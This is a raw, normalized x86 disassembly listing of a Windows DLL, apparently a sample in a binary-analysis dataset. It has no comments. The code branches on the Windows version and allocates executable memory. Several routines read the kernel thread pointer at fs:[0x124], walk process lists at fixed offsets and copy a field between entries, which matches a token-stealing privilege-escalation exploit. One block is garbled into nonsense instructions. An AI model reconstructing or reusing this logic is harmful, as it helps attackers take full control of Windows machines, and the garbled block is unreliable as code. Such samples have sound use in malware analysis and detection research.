mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
mov al [ ebp + 0x14 ]
mov [ ebp - 0xc ] al
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x8 ] eax
call [ GetVersion@IAT ]
mov ebx eax
push 0xffffffbe
movzx eax bl
sub eax 0x4
pop edi
je r-xdata
push 0xffffffe6
pop eax
jmp r-xdata
call sub_1000c680
test al al
je r-xdata
dec eax
je r-xdata
pop esi
leave
retn
lea eax [ ebp - 0x18 ]
push 0x18
push eax
push sub_10008d5f
push 0xffffffe2
pop edi
jmp r-xdata
mov esi 0x9c
lea eax [ ebp - 0xb4 ]
push esi
push 0x0
push eax
call memset
add esp 0xc
lea eax [ ebp - 0xb4 ]
mov [ ebp - 0xb4 ] esi
push eax
call [ GetVersionExA@IAT ]
xor eax eax
mov al bh
movzx eax al
sub eax 0x0
je r-xdata
dec eax
jne r-xdata
mov eax edi
pop edi
pop ebx
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
lea eax [ ebp - 0x18 ]
push 0x18
push eax
push sub_10008e9a
jmp r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x18 ]
push 0x18
push eax
push sub_100094e5
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
call sub_100096ce
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp - 0x20 ] 0x2
lea eax [ ebp - 0x18 ]
push 0x18
push eax
jae r-xdata
dec eax
jne r-xdata
push sub_10009185
jmp r-xdata
push sub_10008fd5
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
lea eax [ ebp - 0x18 ]
push 0x18
push eax
je r-xdata
push sub_10009335
jmp r-xdata
sub_10008d5f
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
mov edi [ eax + 0x108 ]
mov [ ebp - 0x30 ] edi
xor eax eax
mov [ ebp - 0x2c ] eax
push 0xffffffec
pop eax
jmp r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ edi + 0x48 ]
mov ebx [ ecx + eax * 8 ]
mov [ ebp - 0x34 ] ebx
push [ esi + 0x4 ]
push ebx
call [ ebp - 0x20 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x2c ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebx + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
inc [ ebp - 0x2c ]
mov eax [ ebp - 0x2c ]
jmp r-xdata
and [ ebp - 0x38 ] 0x0
cmp eax [ edi + 0x30 ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x38 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + ebx ] ecx
inc [ ebp - 0x38 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x2c ]
shl eax 0x3
mov ecx [ edi + 0x48 ]
mov ecx [ ecx + eax + 0x4 ]
mov [ esi + 0x14 ] ecx
mov ecx [ edi + 0x48 ]
mov edx [ esi + 0x10 ]
mov [ ecx + eax + 0x4 ] edx
movzx eax [ ebx + 0x1 ]
cmp [ ebp - 0x38 ] eax
jae r-xdata
sub_10008e9a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push [ ebp + 0x8 ]
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
mov edi [ eax + 0x12c ]
mov [ ebp - 0x30 ] edi
xor eax eax
mov [ ebp - 0x2c ] eax
push 0xffffffec
pop eax
jmp r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ edi + 0x58 ]
mov ebx [ ecx + eax * 8 ]
mov [ ebp - 0x34 ] ebx
push [ esi + 0x4 ]
push ebx
call [ ebp - 0x20 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x2c ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebx + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
inc [ ebp - 0x2c ]
mov eax [ ebp - 0x2c ]
jmp r-xdata
and [ ebp - 0x38 ] 0x0
cmp eax [ edi + 0x3c ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x38 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + ebx ] ecx
inc [ ebp - 0x38 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x2c ]
shl eax 0x3
mov ecx [ edi + 0x58 ]
mov ecx [ ecx + eax + 0x4 ]
mov [ esi + 0x14 ] ecx
mov ecx [ edi + 0x58 ]
mov edx [ esi + 0x10 ]
mov [ ecx + eax + 0x4 ] edx
movzx eax [ ebx + 0x1 ]
cmp [ ebp - 0x38 ] eax
jae r-xdata
sub_10008fd5
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
mov edi [ ebp + 0x8 ]
push edi
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push edi
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
push rw-data
push edi
call sub_10009b69
mov [ ebp - 0x30 ] eax
push rw-data
push edi
call sub_10009b69
add esp 0x10
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push 0xffffffec
jmp r-xdata
pop eax
push 0xffffffe0
jmp r-xdata
test eax eax
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x28 ]
call [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov ebx eax
mov [ ebp - 0x3c ] ebx
xor eax eax
mov [ ebp - 0x38 ] eax
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_10009146
jmp r-xdata
mov ecx [ ebx + 0x5c ]
mov edi [ ecx + eax * 8 ]
mov [ ebp - 0x40 ] edi
push [ esi + 0x4 ]
push edi
call [ ebp - 0x20 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
cmp [ ebp - 0x38 ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ edi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
inc [ ebp - 0x38 ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
and [ ebp - 0x44 ] 0x0
cmp eax [ ebx + 0x40 ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + edi ] ecx
inc [ ebp - 0x44 ]
jmp r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
shl eax 0x3
mov ecx [ ebx + 0x5c ]
mov ecx [ ecx + eax + 0x4 ]
mov [ esi + 0x14 ] ecx
mov ecx [ ebx + 0x5c ]
mov edx [ esi + 0x10 ]
mov [ ecx + eax + 0x4 ] edx
movzx eax [ edi + 0x1 ]
cmp [ ebp - 0x44 ] eax
jae r-xdata
sub_10009185
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
mov edi [ ebp + 0x8 ]
push edi
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push edi
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
push rw-data
push edi
call sub_10009b69
mov [ ebp - 0x30 ] eax
push rw-data
push edi
call sub_10009b69
add esp 0x10
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push 0xffffffec
jmp r-xdata
pop eax
push 0xffffffe0
jmp r-xdata
test eax eax
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x28 ]
call [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov ebx eax
mov [ ebp - 0x3c ] ebx
xor eax eax
mov [ ebp - 0x38 ] eax
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_100092f6
jmp r-xdata
mov ecx [ ebx + 0x68 ]
mov edi [ ecx + eax * 8 ]
mov [ ebp - 0x40 ] edi
push [ esi + 0x4 ]
push edi
call [ ebp - 0x20 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
cmp [ ebp - 0x38 ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ edi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
inc [ ebp - 0x38 ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
and [ ebp - 0x44 ] 0x0
cmp eax [ ebx + 0x4c ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + edi ] ecx
inc [ ebp - 0x44 ]
jmp r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
shl eax 0x3
mov ecx [ ebx + 0x68 ]
mov ecx [ ecx + eax + 0x4 ]
mov [ esi + 0x14 ] ecx
mov ecx [ ebx + 0x68 ]
mov edx [ esi + 0x10 ]
mov [ ecx + eax + 0x4 ] edx
movzx eax [ edi + 0x1 ]
cmp [ ebp - 0x44 ] eax
jae r-xdata
sub_10009335
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
mov edi [ ebp + 0x8 ]
push edi
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push edi
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
push rw-data
push edi
call sub_10009b69
mov [ ebp - 0x30 ] eax
push rw-data
push edi
call sub_10009b69
add esp 0x10
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push 0xffffffec
jmp r-xdata
pop eax
push 0xffffffe0
jmp r-xdata
test eax eax
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x28 ]
call [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov ebx eax
mov [ ebp - 0x3c ] ebx
xor eax eax
mov [ ebp - 0x38 ] eax
push 0xffffffe1
and [ ebp - 0x4 ] 0x0
call sub_100094a6
jmp r-xdata
mov ecx [ ebx + 0x68 ]
mov edi [ ecx + eax * 8 ]
mov [ ebp - 0x40 ] edi
push [ esi + 0x4 ]
push edi
call [ ebp - 0x20 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
cmp [ ebp - 0x38 ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ edi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
inc [ ebp - 0x38 ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
and [ ebp - 0x44 ] 0x0
cmp eax [ ebx + 0x4c ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + edi ] ecx
inc [ ebp - 0x44 ]
jmp r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
shl eax 0x3
mov ecx [ ebx + 0x68 ]
mov ecx [ ecx + eax + 0x4 ]
mov [ esi + 0x14 ] ecx
mov ecx [ ebx + 0x68 ]
mov edx [ esi + 0x10 ]
mov [ ecx + eax + 0x4 ] edx
movzx eax [ edi + 0x1 ]
cmp [ ebp - 0x44 ] eax
jae r-xdata
sub_100094e5
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x38
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
push 0x57
cmp [ ebp + 0x10 ] 0x18
jne r-xdata
push rw-data
mov edi [ ebp + 0x8 ]
push edi
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0x24 ] 0xffffffe3
and [ ebp - 0x4 ] 0x0
push [ esi ]
push edi
call sub_100099aa
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
test eax eax
jne r-xdata
push 0xffffffc1
jmp r-xdata
push rw-data
push edi
call sub_10009b69
mov [ ebp - 0x30 ] eax
push rw-data
push edi
call sub_10009b69
add esp 0x10
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push 0xffffffec
jmp r-xdata
pop eax
push 0xffffffe0
jmp r-xdata
test eax eax
je r-xdata
pop eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x28 ]
call [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] 0x1
mov ebx eax
mov [ ebp - 0x3c ] ebx
xor eax eax
mov [ ebp - 0x38 ] eax
push 0xffffffe1
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
mov ecx [ ebx + 0x90 ]
mov edi [ ecx + eax * 8 ]
mov [ ebp - 0x40 ] edi
push [ esi + 0x4 ]
push edi
call [ ebp - 0x20 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1000968f
jmp r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x48 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x38 ] 0x3e8
ja r-xdata
mov eax [ esi + 0x8 ]
mov cl [ edi + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
lea ecx [ ebx + 0xd0 ]
push ecx
push [ ebx + 0x78 ]
push [ ebx + 0x90 ]
call eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
push 0xffffffe0
jmp r-xdata
inc [ ebp - 0x38 ]
mov eax [ ebp - 0x38 ]
jmp r-xdata
and [ ebp - 0x44 ] 0x0
cmp eax [ ebx + 0x78 ]
jae r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
lea eax [ eax * 4 + 0x8 ]
mov ecx [ esi + 0x8 ]
mov ecx [ eax + ecx ]
mov [ eax + edi ] ecx
inc [ ebp - 0x44 ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
lea eax [ ebx + 0x90 ]
mov ecx [ ebp - 0x38 ]
shl ecx 0x3
mov edx [ eax ]
mov edx [ edx + ecx + 0x4 ]
mov [ esi + 0x14 ] edx
mov eax [ eax ]
mov edx [ esi + 0x10 ]
mov [ eax + ecx + 0x4 ] edx
movzx eax [ edi + 0x1 ]
cmp [ ebp - 0x44 ] eax
jae r-xdata
sub_100095ee
mov esp 0x458b1873
mov esp 0x885048d
add [ eax ] al
add [ ebx + 0xc8b084e ] cl
or [ ecx + 0x45ff380c ] cl
mov esp 0x7e80dfeb
or al 0x0
je r-xdata
and [ ebp - 0x24 ] 0x0
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
lea eax [ ebx + 0x90 ]
mov ecx [ ebp - 0x38 ]
shl ecx 0x3
mov edx [ eax ]
mov edx [ edx + ecx + 0x4 ]
mov [ esi + 0x14 ] edx
mov eax [ eax ]
mov edx [ esi + 0x10 ]
mov [ eax + ecx + 0x4 ] edx
and [ ebp - 0x4 ] 0x0
call sub_1000968f
jmp r-xdata
push rw-data
push [ ebp + 0x8 ]
call sub_10009b69
pop ecx
pop ecx
mov [ ebp - 0x48 ] eax
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
lea ecx [ ebx + 0xd0 ]
push ecx
push [ ebx + 0x78 ]
push [ ebx + 0x90 ]
call eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call _local_unwind2
pop ecx
pop ecx
push 0xffffffe0
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
pop eax
sub_100096ce
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
xor esi esi
cmp [ ebp + 0x8 ] esi
jne r-xdata
call [ GetVersion@IAT ]
movzx ecx al
mov [ ebp - 0x28 ] ecx
xor ecx ecx
mov cl ah
movzx eax cl
mov [ ebp - 0x20 ] eax
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push 0x88000000
push rw-data
push rw-data
push esi
call [ CreateWindowExW@IAT ]
mov edi eax
mov [ ebp - 0x1c ] edi
cmp edi esi
jne r-xdata
push 0x57
jmp r-xdata
push 0x40
mov eax 0x1000
push eax
push eax
push esi
call [ VirtualAlloc@IAT ]
mov ebx eax
mov [ ebp - 0x2c ] ebx
cmp ebx esi
jne r-xdata
push 0xffffffd3
jmp r-xdata
pop eax
jmp r-xdata
call sub_100098c4
mov [ ebp - 0x34 ] eax
cmp eax esi
jne r-xdata
push 0xffffffd8
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x30 ] 0xffffffff
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0x28 ]
sub eax 0x4
je r-xdata
push 0xffffffbf
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
push ebx
call sub_1000a0fc
dec eax
je r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
dec eax
jne r-xdata
cmp [ ebp - 0x20 ] 0x1
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
push ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
push ebx
call sub_1000b46f
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_10009801
mov eax [ ebp - 0x30 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
push ebx
call sub_1000b73a
jmp r-xdata
call sub_1000a2cd
jmp r-xdata
call sub_1000ab6f
jmp r-xdata
add esp 0x14
mov [ ebp - 0x30 ] eax
sub_10009801
cmp [ ebp - 0x34 ] esi
je r-xdata
cmp edi esi
je r-xdata
push [ ebp - 0x34 ]
call [ ReleaseMutex@IAT ]
push [ ebp - 0x34 ]
call [ CloseHandle@IAT ]
cmp ebx esi
je r-xdata
push edi
call [ DestroyWindow@IAT ]
retn
push 0x8000
push esi
push ebx
call [ VirtualFree@IAT ]
sub_10009835
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
test edi edi
jbe r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
add eax esi
mov edx ecx
shr edx 0x8
mov [ eax ] cl
mov [ eax + 0x1 ] dl
mov edx ecx
pop edi
shr edx 0x10
shr ecx 0x18
mov [ eax + 0x2 ] dl
mov [ eax + 0x3 ] cl
mov eax [ ebp + 0x20 ]
mov ecx [ ebp + 0x1c ]
add eax esi
mov edx ecx
shr edx 0x8
mov [ eax ] cl
mov [ eax + 0x1 ] dl
mov edx ecx
pop esi
shr edx 0x10
shr ecx 0x18
mov [ eax + 0x2 ] dl
mov [ eax + 0x3 ] cl
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx esi
sub eax esi
mov dl [ eax + ecx ]
mov [ ecx ] dl
inc ecx
dec edi
jne r-xdata
sub_10009898
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
test edi edi
jbe r-xdata
mov eax [ ebp + 0x18 ]
mov cl [ ebp + 0x14 ]
pop edi
mov [ esi + eax ] cl
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx esi
sub eax esi
mov dl [ eax + ecx ]
mov [ ecx ] dl
inc ecx
dec edi
jne r-xdata
sub_100098c4
push esi
push edi
push rw-data
push 0x0
push 0x100000
call [ OpenMutexW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push 0x3a98
push edi
call [ WaitForSingleObject@IAT ]
mov esi eax
cmp esi 0x80
je r-xdata
call [ GetLastError@IAT ]
push eax
call [ SetLastError@IAT ]
xor eax eax
jmp r-xdata
mov eax edi
test esi esi
je r-xdata
pop edi
pop esi
retn
push ebx
call [ GetLastError@IAT ]
push edi
mov ebx eax
call [ CloseHandle@IAT ]
cmp esi 0x102
jne r-xdata
push ebx
push 0x79
jmp r-xdata
call [ SetLastError@IAT ]
xor eax eax
pop ebx
jmp r-xdata
sub_10009936
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
mov esi [ ebp + 0x8 ]
push r--data
push esi
call sub_10009b69
pop ecx
test eax eax
pop ecx
je r-xdata
test esi esi
jne r-xdata
call eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
cmp eax 0x5
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x6
jne r-xdata
cmp [ esi + 0xc ] 0x2
jne r-xdata
pop esi
leave
retn
mov eax [ fs : 0x124 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x124 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x1
jb r-xdata
mov eax [ fs : 0x124 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_100099aa
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
je r-xdata
xor eax eax
mov ecx [ eax + 0x8 ]
sub ecx 0x4
je r-xdata
push eax
call sub_10009936
mov edx [ ebp + 0xc ]
pop ecx
mov ecx eax
cmp [ ecx + 0x94 ] edx
je r-xdata
dec ecx
je r-xdata
pop esi
pop ebp
retn
mov eax [ eax + 0x98 ]
sub eax 0x98
je r-xdata
mov ecx [ eax + 0xc ]
cmp ecx esi
jne r-xdata
dec ecx
jne r-xdata
cmp eax ecx
je r-xdata
cmp ecx 0x1
jne r-xdata
push eax
call sub_10009936
mov edx [ ebp + 0xc ]
pop ecx
mov ecx eax
cmp [ ecx + 0x9c ] edx
je r-xdata
push eax
call sub_10009936
pop ecx
xor edx edx
mov ecx eax
cmp ecx esi
je r-xdata
inc esi
cmp esi 0x3e8
jg r-xdata
cmp ecx 0x2
jne r-xdata
push eax
call sub_10009936
mov edx [ ebp + 0xc ]
pop ecx
mov ecx eax
cmp [ ecx + 0x84 ] edx
je r-xdata
mov eax [ eax + 0xa0 ]
sub eax 0xa0
je r-xdata
mov esi [ eax + 0x9c ]
cmp esi [ ebp + 0xc ]
je r-xdata
cmp [ eax + 0x94 ] edx
jne r-xdata
cmp [ eax + 0x10 ] si
push eax
jne r-xdata
mov eax [ eax + 0x88 ]
sub eax 0x88
je r-xdata
cmp eax ecx
je r-xdata
mov eax [ eax + 0xa0 ]
sub eax 0xa0
je r-xdata
jmp r-xdata
call sub_10009936
pop ecx
mov ecx eax
cmp ecx esi
je r-xdata
call sub_10009936
mov edx [ ebp + 0xc ]
pop ecx
mov ecx eax
cmp [ ecx + 0x84 ] edx
je r-xdata
cmp eax ecx
je r-xdata
inc esi
cmp esi 0x3e8
jg r-xdata
cmp eax ecx
je r-xdata
mov edx [ eax + 0x94 ]
cmp edx [ ebp + 0xc ]
je r-xdata
mov eax [ eax + 0x88 ]
sub eax 0x88
je r-xdata
inc esi
cmp esi 0x3e8
jg r-xdata
cmp [ eax + 0x9c ] edx
jne r-xdata
inc edx
cmp edx 0x3e8
jle r-xdata
mov eax [ eax + 0x98 ]
sub eax 0x98
je r-xdata
cmp eax ecx
je r-xdata
cmp [ eax + 0x84 ] edx
jne r-xdata
jmp r-xdata
cmp eax ecx
je r-xdata
inc esi
cmp esi 0x3e8
jg r-xdata
jmp r-xdata
inc esi
cmp esi 0x3e8
jle r-xdata
cmp [ eax + 0x84 ] edx
jne r-xdata
jmp r-xdata
jmp r-xdata
sub_10009b69
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
test esi esi
push edi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
cmp [ esi + 0x18 ] 0x0
push edi
je r-xdata
push [ esi ]
call [ GetProcAddress@IAT ]
mov ecx eax
call strlen
mov [ ebp - 0x8 ] ax
mov eax [ ebp - 0x8 ]
inc eax
pop ecx
mov [ ebp - 0x6 ] ax
lea eax [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push eax
lea eax [ ebp - 0x8 ]
push 0x0
push eax
mov [ ebp - 0x4 ] edi
push [ esi ]
call [ esi + 0x18 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
sub eax [ esi ]
add eax ecx
jmp r-xdata
